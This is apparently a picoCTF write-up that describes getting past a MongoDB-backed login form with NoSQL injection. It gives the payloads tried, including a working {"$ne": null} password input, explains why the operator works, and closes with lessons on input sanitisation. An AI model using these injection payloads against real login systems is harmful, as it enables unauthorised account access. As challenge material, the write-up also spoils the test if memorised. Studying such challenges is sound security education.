## Objective

A login form was discovered on a web application hosted as part of the challenge. The app uses a NoSQL database (likely MongoDB) to store and query credentials. The goal was to bypass login using a NoSQL injection technique and retrieve the flag.

## Initial Reconnaissance

### Target Information

- **URL/IP**: picoCTF challenge web interface
- **Ports**: HTTP/HTTPS
- **Services**: Web application with login form

### Tools Used

- Firefox + DevTools  
- Burp Suite (optional)  
- Basic browser and form inspection  
- Manual payload crafting

### Commands/Steps

```bash
# Access challenge web interface
# Inspect login form elements
```

## Methodology

### Step 1: Form Analysis and Reconnaissance

Accessed the challenge web interface from the picoCTF platform and observed a login page with `username` and `password` fields. Attempted normal credentials but failed, then guessed that the backend might be using **MongoDB** due to the challenge category.

**Command/Code:**
```bash
# Browser inspection of login form
# Attempted normal credentials: admin/admin, admin/password, etc.
```

**Output:**
```
Login failed with normal credentials
Form accepts various input formats
```

### Step 2: NoSQL Injection Payload Testing

Tried known **NoSQL injection payloads** in the input fields to bypass authentication.

**Command/Code:**
```javascript
// Payload 1: SQL-like injection
Username: admin' || 1==1 //

// Payload 2: NoSQL specific
Username: admin
Password: {"$ne": null}
```

**Output:**
```
Payload 1: Failed
Payload 2: Success - Authentication bypassed
```

### Step 3: Authentication Bypass

Successfully bypassed authentication using NoSQL injection technique.

**Command/Code:**
```plaintext
Username: admin
Password: {"$ne": null}
```

**Output:**
```
Login successful!
Flag: picoCTF{***REDACTED***}
```

### Final Answer

```
picoCTF{***REDACTED***}
```

### Complete Walkthrough

Successfully bypassed the login form using NoSQL injection by providing `{"$ne": null}` as the password. This payload works because `"$ne"` is the MongoDB operator for "not equal", and by providing `{"$ne": null}`, we trick the query to match any non-null password, effectively bypassing authentication.

## Key Learnings

- NoSQL injections don't require quotes or SQL syntax â€” they often use JSON-like structure
- Always sanitize user input, even in NoSQL databases
- MongoDB's query structure can be exploited using logical operators like `$ne`, `$gt`, `$regex`, etc.
- Authentication bypass is one of the easiest ways to demonstrate impactful vulnerabilities in CTFs

## Tools and Resources

### Tools Used

- **Firefox + DevTools**: For web application inspection
- **Burp Suite**: For HTTP request manipulation (optional)
- **Browser**: For form interaction and payload testing
